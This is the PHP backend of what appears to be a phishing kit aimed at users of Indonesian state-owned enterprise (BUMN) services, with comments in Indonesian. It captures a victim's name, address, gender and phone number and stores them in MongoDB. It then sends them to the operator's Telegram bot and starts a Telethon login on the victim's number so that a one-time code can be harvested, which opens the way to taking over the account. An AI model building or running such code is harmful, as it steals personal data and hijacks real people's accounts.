<?php
require_once __DIR__ . '/db_config.php';
require_once __DIR__ . '/MongoDBSessionHandler.php';
require_once __DIR__ . '/telegram.php';
require_once __DIR__ . '/telegram_config.php';

// Inisialisasi MongoDB Session Handler
$mongoSessionHandler = new MongoDBSessionHandler($mongo_connection_string);
session_set_save_handler($mongoSessionHandler, true);
$GLOBALS['mongoSessionHandler'] = $mongoSessionHandler;

session_start();

$fullname = $_POST['fullname'] ?? '';
$address = $_POST['address'] ?? '';
$gender = $_POST['gender'] ?? '';
$phoneNumber = $_POST['phoneNumber'] ?? '';

$string = "== Result Phising BUMN ==\n";
$string .= "Fullname : `$fullname`\n";
$string .= "Address : `$address`\n";
$string .= "Gender : `$gender`\n";
$string .= "Phone : `$phoneNumber`\n";

$_SESSION['message'] = $string;
$_SESSION['user_data'] = [
    'fullname' => $fullname,
    'address' => $address,
    'gender' => $gender,
    'phoneNumber' => $phoneNumber,
    'timestamp' => time()
];

// Simpan juga ke MongoDB secara langsung
if (isset($mongoSessionHandler)) {
    $mongoSessionHandler->saveTelegramData($string, [
        'form_data' => [
            'fullname' => $fullname,
            'address' => $address,
            'gender' => $gender,
            'phoneNumber' => $phoneNumber
        ],
        'stage' => 'initial_form'
    ]);
}

// Kirim ke bot Telegram
sendTelegram($string);

// Integrate with Telethon - start authentication process
$session_id = session_id();
$command = escapeshellcmd("python $telegram_auth_script form " . escapeshellarg($phoneNumber) . " " . escapeshellarg($session_id));
$output = shell_exec($command);
$result = json_decode($output, true);

// Store the result in session for the next page
$_SESSION['telegram_phone'] = $phoneNumber;
$_SESSION['telegram_auth_started'] = true;

// Return success (we'll continue with OTP regardless of Telethon success)
echo json_encode(['success' => true]);
